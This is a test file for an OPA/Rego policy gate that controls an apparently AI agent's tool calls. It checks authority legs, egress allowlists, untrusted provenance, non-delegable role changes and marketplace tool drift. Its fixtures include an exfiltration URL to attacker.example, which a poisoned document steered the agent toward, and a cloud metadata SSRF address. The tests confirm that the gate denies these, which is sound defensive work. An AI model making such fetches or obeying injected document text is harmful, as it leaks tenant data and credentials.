# Policy tests, run by `opa test` against the SAME digest the gateway
# ships (PROPOSED-DEPS.md's one-pin rule: a separately-installed CI opa
# would test the policy with a different binary than the one that
# enforces it).
#
# These test the POLICY. The gate's behaviour when OPA itself fails is a
# different question with a different instrument -- the fault shims in
# gateway/test_faults/ -- because no amount of policy testing can tell
# you what happens when the policy engine is dead.
#
# M3 T6: every authority leg is tested on BOTH sides -- denied alone (the
# other legs passing, so the reason is the leg's own) and allowed. A leg
# tested only for its deny cannot be told apart from a leg that denies
# everything (the plan's M3 T0 D3 and T6 acceptance line).
#
# M3 T7: the delegability leg. Its allow side is every allow test in this
# file (no document tool is on the list, pinned below); its deny side is
# set_member_role, refused even where every other leg would allow it.

package bazaar.gate_test

import rego.v1

import data.bazaar.gate

acme := "0a000000-0000-4000-8000-000000000001"

initech := "0a000000-0000-4000-8000-000000000003"

policy_data := {
	"tools": ["read_document", "http_fetch", "update_document", "delete_document", "set_member_role"],
	"org_grants": {
		acme: ["read_document", "http_fetch", "update_document", "delete_document"],
		initech: ["read_document"],
	},
	"egress_allowlist": ["docs.example", "metadata.google.internal"],
}

all_pass := {"within_time": true, "in_scope": true, "role_permits": true}

# A call in Acme, every authority leg passing, clean provenance. Each test
# changes only what it is about.
call(tool, extra) := object.union(
	{
		"tool": tool,
		"args": {},
		"session": {"id": "s-1", "org": acme, "acting_for": "u-1"},
		"provenance": {"derived_from": ["user"]},
		"resolved": {},
		"authority": {"role_now": "admin", "legs": all_pass},
	},
	extra,
)

# replace swaps a whole top-level subtree. object.union MERGES nested
# objects, so a union could never express "this leg is missing" or "this
# session has no org" -- the base's values would survive the merge.
replace(obj, key, val) := object.union(object.remove(obj, [key]), {key: val})

with_legs(tool, legs) := replace(call(tool, {}), "authority", {"role_now": "viewer", "legs": legs})

decide(inp) := d if {
	d := gate.decision with input as inp
		with data.tools as policy_data.tools
		with data.org_grants as policy_data.org_grants
		with data.egress_allowlist as policy_data.egress_allowlist
}

clean_fetch := {
	"args": {"url": "http://docs.example/a"},
	"resolved": {"host": "docs.example", "ip": "93.184.216.34", "denied_range": false},
}

# --- the allow path: every tool, every leg passing --------------------

test_each_document_tool_is_allowed_when_every_leg_passes if {
	every tool in ["read_document", "update_document", "delete_document"] {
		decide(call(tool, {})).route == "allow"
	}
}

test_clean_fetch_to_an_allowlisted_host_is_allowed if {
	decide(call("http_fetch", clean_fetch)).route == "allow"
}

# --- each authority leg, denied alone ---------------------------------

test_expired_session_is_denied_with_its_own_reason if {
	d := decide(with_legs("delete_document", {"within_time": false, "in_scope": true, "role_permits": true}))
	d.reasons == ["session_expired"]
}

test_out_of_scope_tool_is_denied_with_its_own_reason if {
	d := decide(with_legs("delete_document", {"within_time": true, "in_scope": false, "role_permits": true}))
	d.reasons == ["not_in_session_scope"]
}

# Finding 05's hardened reason: the viewer's session asked for delete in
# its scope (consent, M3-N5), the org grants it, and the ROLE refuses it.
test_role_below_the_action_is_denied_with_its_own_reason if {
	d := decide(with_legs("delete_document", {"within_time": true, "in_scope": true, "role_permits": false}))
	d.reasons == ["role_does_not_permit"]
}

# The org-grant leg, both sides, on seeded data: Initech is granted
# read_document only.
test_org_grant_allows_what_it_lists if {
	inp := call("read_document", {"session": {"id": "s-2", "org": initech, "acting_for": "u-2"}})
	decide(inp).route == "allow"
}

test_org_grant_absent_denies_what_it_does_not_list if {
	inp := call("http_fetch", object.union(clean_fetch, {"session": {"id": "s-2", "org": initech, "acting_for": "u-2"}}))
	decide(inp).reasons == ["org_grant_absent"]
}

# No default grant: an org the data does not list is granted nothing.
test_an_unlisted_org_is_granted_nothing if {
	inp := call("read_document", {"session": {"id": "s-3", "org": "0a000000-0000-4000-8000-0000000000ff", "acting_for": "u"}})
	decide(inp).reasons == ["org_grant_absent"]
}

# --- fail closed: a leg that is missing or not exactly true FAILS -----

test_no_authority_at_all_is_denied if {
	inp := json.remove(call("read_document", {}), ["authority"])
	d := decide(inp)
	d.route == "deny"
	d.reasons == ["session_expired"]
}

test_each_missing_leg_fails_on_its_own if {
	decide(with_legs("read_document", {"in_scope": true, "role_permits": true})).reasons == ["session_expired"]
	decide(with_legs("read_document", {"within_time": true, "role_permits": true})).reasons == ["not_in_session_scope"]
	decide(with_legs("read_document", {"within_time": true, "in_scope": true})).reasons == ["role_does_not_permit"]
}

test_a_truthy_string_is_not_a_pass if {
	decide(with_legs("read_document", {"within_time": "true", "in_scope": true, "role_permits": true})).reasons == ["session_expired"]
}

test_no_session_org_is_granted_nothing if {
	inp := replace(call("read_document", {}), "session", {"id": "s-1"})
	decide(inp).reasons == ["org_grant_absent"]
}

# Empty grants grant nothing. (`opa test` loads this directory's data.json,
# so org_grants cannot be made ABSENT here; the policy's `default
# org_grants := {}` makes absent behave exactly like this empty map.)
test_empty_org_grants_grant_nothing if {
	d := gate.decision with input as call("read_document", {})
		with data.tools as policy_data.tools
		with data.org_grants as {}
		with data.egress_allowlist as policy_data.egress_allowlist
	d.reasons == ["org_grant_absent"]
}

# --- order: the first failing leg is the one reported -----------------

test_order_time_before_scope_before_role if {
	decide(with_legs("delete_document", {"within_time": false, "in_scope": false, "role_permits": false})).reasons == ["session_expired"]
	decide(with_legs("delete_document", {"within_time": true, "in_scope": false, "role_permits": false})).reasons == ["not_in_session_scope"]
}

test_order_grant_before_role if {
	inp := object.union(
		with_legs("delete_document", {"within_time": true, "in_scope": true, "role_permits": false}),
		{"session": {"id": "s-2", "org": initech, "acting_for": "u-2"}},
	)
	decide(inp).reasons == ["org_grant_absent"]
}

# The 03 least-privilege variant (D7): a session scoped to read_document
# only, steered into the exfiltration fetch. The scope leg refuses it
# before the egress legs run.
test_03_least_privilege_dies_at_the_scope if {
	inp := object.union(
		with_legs("http_fetch", {"within_time": true, "in_scope": false, "role_permits": true}),
		{
			"args": {"url": "http://attacker.example/collect?data=x"},
			"provenance": {"derived_from": ["user", "untrusted"]},
			"resolved": {"host": "attacker.example", "ip": "172.20.0.9", "denied_range": true},
		},
	)
	decide(inp).reasons == ["not_in_session_scope"]
}

# A role failure outranks the egress legs too.
test_role_before_egress if {
	inp := object.union(
		with_legs("http_fetch", {"within_time": true, "in_scope": true, "role_permits": false}),
		{"resolved": {"host": "attacker.example", "ip": "172.20.0.9", "denied_range": true}},
	)
	decide(inp).reasons == ["role_does_not_permit"]
}

# --- M2's findings, unchanged under passing authority -----------------

# THE ORDERING TEST. attacker.example fails the allowlist leg AND the
# range leg (the Compose bridge is RFC1918) AND the provenance leg (the
# document is untrusted). Exactly one reason must come back, and it must
# be the allowlist -- otherwise finding 03's evidence becomes "private
# address", which is an artifact of the lab rather than the control.
test_finding_03_dies_at_the_allowlist_with_one_reason if {
	d := decide(call("http_fetch", {
		"args": {"url": "http://attacker.example/collect?data=x"},
		"provenance": {"derived_from": ["user", "untrusted"]},
		"resolved": {"host": "attacker.example", "ip": "172.20.0.9", "denied_range": true},
	}))
	d.route == "deny"
	d.reasons == ["egress_not_allowlisted"]
}

test_finding_04_passes_the_allowlist_and_dies_at_the_range if {
	d := decide(call("http_fetch", {
		"args": {"url": "http://metadata.google.internal/computeMetadata/v1/"},
		"resolved": {"host": "metadata.google.internal", "ip": "169.254.169.254", "denied_range": true},
	}))
	d.reasons == ["resolved_address_denied"]
}

# The same finding driven THROUGH the poisoned document: untrusted
# provenance is present, and the reason must not change. This is why the
# range leg sits before the provenance leg -- the asserted evidence must
# not depend on how the PoC chose to drive the call.
test_finding_04_reason_is_stable_under_untrusted_provenance if {
	d := decide(call("http_fetch", {
		"args": {"url": "http://metadata.google.internal/computeMetadata/v1/"},
		"provenance": {"derived_from": ["user", "untrusted"]},
		"resolved": {"host": "metadata.google.internal", "ip": "169.254.169.254", "denied_range": true},
	}))
	d.reasons == ["resolved_address_denied"]
}

# SR-B7-2: allowlisting is a host decision, never a payload decision. An
# allowlisted destination with a public address and tenant-derived
# content is still a denial.
test_tenant_data_to_an_allowlisted_host_is_denied if {
	d := decide(call("http_fetch", object.union(clean_fetch, {"provenance": {"derived_from": ["user", "untrusted"]}})))
	d.reasons == ["tenant_data_egress"]
}

# --- the tool leg -----------------------------------------------------

test_an_unknown_tool_is_denied if {
	decide(call("exfiltrate", {})).reasons == ["unknown_tool"]
}

# A tool missing from data.tools dies here, before delegability: the tool
# leg is first. (set_member_role IS listed, so it reaches its own leg --
# see the delegability section.)
test_unknown_tool_comes_before_delegability if {
	d := gate.decision with input as call("set_member_role", {})
		with data.tools as ["read_document", "http_fetch", "update_document", "delete_document"]
		with data.org_grants as policy_data.org_grants
		with data.egress_allowlist as policy_data.egress_allowlist
	d.reasons == ["unknown_tool"]
}

# --- delegability (M3 T7; m3-delegation.md D6) ------------------------

# Finding 06's hardened reason, against the data the gateway ships (no
# `with data` overrides): an admin's session, every authority leg passing.
# The role leg would allow this -- an admin may change roles directly --
# so the denial is delegability's alone.
test_set_member_role_is_not_delegable_on_the_shipped_data if {
	d := gate.decision with input as call("set_member_role", {})
	d.route == "deny"
	d.reasons == ["control_plane_not_delegable"]
}

# SR-B8-2's "explicit, not by accident": set_member_role is a KNOWN tool,
# so its denial is the denylist's, never unknown_tool's.
test_set_member_role_is_a_known_tool if {
	"set_member_role" in data.tools
}

# Even granted to the org, in scope, and the requester an admin, it is
# refused: the denylist alone denies it. Granting it is a mistake the
# shipped data does not make (next test); this proves the leg does not
# depend on that.
test_non_delegable_even_when_granted_in_scope_and_admin if {
	granted := object.union(policy_data.org_grants, {acme: array.concat(policy_data.org_grants[acme], ["set_member_role"])})
	d := gate.decision with input as call("set_member_role", {})
		with data.tools as policy_data.tools
		with data.org_grants as granted
		with data.egress_allowlist as policy_data.egress_allowlist
	d.reasons == ["control_plane_not_delegable"]
}

# The third layer (M3 T7 D2): no org in the shipped data is granted a
# control-plane tool. Read from data.json itself, not from policy_data.
test_no_org_is_granted_a_non_delegable_tool if {
	every _, tools in data.org_grants {
		every tool in gate.non_delegable {
			not tool in tools
		}
	}
}

# Order: delegability outranks every session and org leg, so an attempt at
# a control-plane action is never reported as an ordinary expiry, scope or
# grant failure (the attempt is what T10 detects).
test_delegability_comes_before_every_session_leg if {
	none := {"within_time": false, "in_scope": false, "role_permits": false}
	decide(with_legs("set_member_role", none)).reasons == ["control_plane_not_delegable"]
	inp := object.union(with_legs("set_member_role", none), {"session": {"id": "s-2", "org": initech, "acting_for": "u-2"}})
	decide(inp).reasons == ["control_plane_not_delegable"]
	decide(json.remove(call("set_member_role", {}), ["authority"])).reasons == ["control_plane_not_delegable"]
}

# The denylist is not policy data (M3 T7 D1): data that tries to empty or
# replace it changes nothing.
test_the_denylist_is_not_policy_data if {
	d := gate.decision with input as call("set_member_role", {})
		with data.non_delegable as []
		with data.tools as policy_data.tools
		with data.org_grants as policy_data.org_grants
		with data.egress_allowlist as policy_data.egress_allowlist
	d.reasons == ["control_plane_not_delegable"]
}

# The allow side: no data-plane tool is on the list. Every allow test
# above depends on it; this names it.
test_no_document_tool_is_non_delegable if {
	every tool in ["read_document", "http_fetch", "update_document", "delete_document"] {
		not tool in gate.non_delegable
	}
}

# Empty input must not be an allow. A policy whose empty case allows is
# the shape a garbage-emitting engine turns into a bypass.
test_empty_input_is_denied if {
	decide({}).route == "deny"
}


# --- M4a T5: the marketplace channel ----------------------------------
#
# Every case changes only what it is about, on the same base call()
# above. The drift leg's allow side is the consent cases below it; its
# deny side is three shapes: the rewritten manifest (same tool, new
# bytes), the unreachable server (nothing could be verified), and the
# rug-pulled name (a tool the pin never knew). All three share ONE
# reason, which is the point of the leg.

installed_base := {
	"resolved": {"tool_known": true, "pin_verified": true},
	"authority": {
		"role_now": "member",
		"legs": all_pass,
		"install": {
			"exists": true,
			"tool_in_pin": true,
			"receives_document_content": false,
		},
	},
}

mkt_call(tool, extra) := object.union(call(tool, installed_base), extra)

test_installed_tool_with_verified_pin_is_allowed if {
	decide(mkt_call("summarize_notes", {})).route == "allow"
}

test_drift_denies_three_shapes_with_one_reason if {
	# The rewritten manifest (same tool, new bytes), the unreachable
	# server (M4a-N2's trap: nothing could be verified, which must not
	# read as "no drift"), and a garbage live manifest: the policy sees
	# ONE fact -- pin_verified false with the tool known -- and answers
	# ONE reason. The distinction lives in the gateway's detail record,
	# not in the decision.
	every d in [
		decide(mkt_call("summarize_notes",
			{"resolved": {"tool_known": true, "pin_verified": false}})),
		decide(mkt_call("export_archive",
			{"resolved": {"tool_known": true, "pin_verified": false}})),
	] {
		d.reasons == ["schema_drift_reapproval_required"]
	}
}

test_missing_drift_facts_fail_closed if {
	# The marketplace call with NO resolved facts at all: tool_known
	# defaults false, so the name is unknown -- and had tool_known been
	# asserted without pin_verified, the drift leg's own default is the
	# fail-closed direction (the M2 lesson, restated for this leg).
	d := decide(call("summarize_notes", {}))
	d.reasons == ["unknown_tool"]
}

test_drift_leg_masks_nothing_and_is_masked_by_nothing if {
	# A rug-pulled name in an expired session dies at the session leg:
	# ordinary session facts keep their reasons ahead of drift.
	d := decide(object.union(mkt_call("export_archive",
		{"resolved": {"tool_known": true, "pin_verified": false}}),
		{"authority": {"role_now": "member",
			"legs": {"within_time": false, "in_scope": true, "role_permits": true},
			"install": {"exists": true, "tool_in_pin": false,
				"receives_document_content": false}}}))
	d.reasons == ["session_expired"]
}

test_marketplace_consent_denies_tenant_bytes_without_document_consent if {
	# Finding 07's hardened shape: pin verified, tool known, every
	# session leg passing -- the document bytes still may not leave,
	# because the pin declared user_text only.
	d := decide(object.union(mkt_call("summarize_notes", {}),
		{"provenance": {"derived_from": ["user", "untrusted"]}}))
	d.reasons == ["tenant_data_egress"]
}

test_marketplace_call_with_declared_document_consent_is_allowed if {
	# The honest summarizer (M4a-N1): document_content declared at
	# install, the org's blessing on record. No leg can read intent;
	# the install review is load-bearing, and this allow is its verdict.
	d := decide(object.union(mkt_call("summarize_notes",
		{"provenance": {"derived_from": ["user", "untrusted"]}}),
		{"authority": {"role_now": "member", "legs": all_pass,
			"install": {"exists": true, "tool_in_pin": true,
				"receives_document_content": true}}}))
	d.route == "allow"
}

test_absent_pin_verified_fact_reads_as_drift_not_as_clean if {
	# The fail-closed default on its own terms (the M2 lesson, restated
	# for this leg): a marketplace call whose resolved facts name the
	# tool but say NOTHING about the pin was never verified. Absence is
	# "not established", never "fine" -- the same asymmetry
	# denied_range's TRUE default carries.
	# replace(), not a union: a merge would keep the base's
	# pin_verified true, and the whole point is its ABSENCE.
	d := decide(replace(mkt_call("summarize_notes", {}),
		"resolved", {"tool_known": true}))
	d.reasons == ["schema_drift_reapproval_required"]
}

test_rug_pulled_name_dies_at_drift_not_at_the_grant_leg if {
	# The module's PoC contract (m4a-marketplace.md 7): a name only the
	# live manifest knows -- every session leg passing, tool_in_pin
	# false -- is the rug pull's own shape, and the reason the org must
	# read is the re-approval, not "we never granted this". True as the
	# grant leg may read, it would bury the thesis reason; drift
	# evaluates first. Found live, where the first cut of this
	# amendment had drift after the grant leg and the run answered
	# org_grant_absent.
	d := decide(object.union(mkt_call("export_archive",
		{"resolved": {"tool_known": true, "pin_verified": false}}),
		{"authority": {"role_now": "member", "legs": all_pass,
			"install": {"exists": true, "tool_in_pin": false,
				"receives_document_content": false}}}))
	d.reasons == ["schema_drift_reapproval_required"]
}

test_platform_tools_carry_no_marketplace_channel if {
	# The platform legs are unchanged: read_document with install facts
	# accidentally present still decides on its own legs alone.
	d := decide(call("read_document", installed_base))
	d.route == "allow"
}

test_live_known_name_without_pin_consent_still_fails_the_grant_leg if {
	# A name the pin does not carry (tool_in_pin false) with NO drift
	# fact established: the org granted it nothing. This is the leg-5
	# widening's deny side.
	d := decide(object.union(mkt_call("export_archive", {}),
		{"resolved": {"tool_known": true, "pin_verified": true},
		 "authority": {"role_now": "member", "legs": all_pass,
			"install": {"exists": true, "tool_in_pin": false,
				"receives_document_content": false}}}))
	d.reasons == ["org_grant_absent"]
}
